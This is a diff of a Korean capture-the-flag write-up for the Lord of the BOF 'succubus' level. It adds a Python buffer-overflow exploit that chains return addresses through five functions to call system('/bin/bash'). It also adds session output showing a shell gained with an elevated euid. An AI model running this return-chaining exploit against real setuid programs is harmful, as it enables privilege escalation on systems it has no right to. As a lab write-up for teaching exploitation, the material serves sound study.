@@ -234,7 +234,7 @@ void MO(char *cmd)
 0xbffffa9c:	0x0804839c	0x0804894c	0x4000ae60	0xbffffaac
 ```
 
-0xbfbfbfbf 가 들어간 이후를 보니 "'/bin/sh"문자열이 ASCII 코드로 들어가 있다. 이 주소를 구해보면 0xbffffa88 가 된다. 이 주소를 0xbfbfbfbf에 넣으면 끄읏!
+0xbfbfbfbf 가 들어간 이후를 보니 "'/bin/sh"문자열이 ASCII 코드로 들어가 있다. 이 주소를 구해보면 `0xbffffa88` 가 된다. 이 주소를 `0xbfbfbfbf`에 넣으면 끄읏!
 
 ```python
 string = "/bin/sh"
@@ -264,5 +264,65 @@ payload 시나리오 :
 ./succubus `python -c 'print "A"*44+"\xec\x87\x04\x08"+"\xbc\x87\x04\x08"+"\x8c\x87\x04\x08"+"\x5c\x87\x04\x08"+"\x24\x87\x04\x08"+"\x90"*4+"\xb8\xfa\xff\xbf"+"/bin/sh"'`
 ```
 
+```
+[zombie_assassin@localhost zombie_assassin]$ python ex.py
+릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱릱?♦펶뙁\?$?릱릱H??bin/bash
+welcome to the DO!
+welcome to the GYE!
+welcome to the GUL!
+welcome to the YUT!
+welcome to the MO!
+bash: /home/zombie_assassin/.bashrc: Permission denied
+bash$ id
+uid=516(zombie_assassin) gid=516(zombie_assassin) euid=517(succubus) egid=517(succubus) groups=516(zombie_assassin)
+bash$ my-pass
+euid = 517
+here to stay
+```
+
 -----
+
+##### python
+
+```python
+import os
+import struct
+
+append = lambda x: payload + x
+p32 = lambda x: struct.pack("<I", x)
+
+target = "/home/zombie_assassin/succubus"
+#target = "/home/zombie_assassin/auccubus"
+
+DO_addr = 0x80487ec
+GYE_addr = 0x80487bc
+GUL_addr = 0x804878c
+YUT_addr = 0x804875c
+MO_addr = 0x8048724
+
+padding = 0x90909090
+
+binsh_addr = 0xbffffa88
+
+payload = "\x90"*44
+payload = append(p32(DO_addr))		# main ret
+payload = append(p32(GYE_addr))		# DO ret
+payload = append(p32(GUL_addr))		# GYE ret
+payload = append(p32(YUT_addr)) 	# GUL ret
+payload = append(p32(MO_addr))		# YUT ret
+payload = append(p32(padding))		# MO ret
+payload = append(p32(binsh_addr))	# system arg
+payload = append("/bin/bash")
+
+pid = os.fork()
+
+if pid == 0:
+        os.execv(target, (target, payload))
+else:
+        os.waitpid(pid, 0)
+```
+
+-----
+
+
 
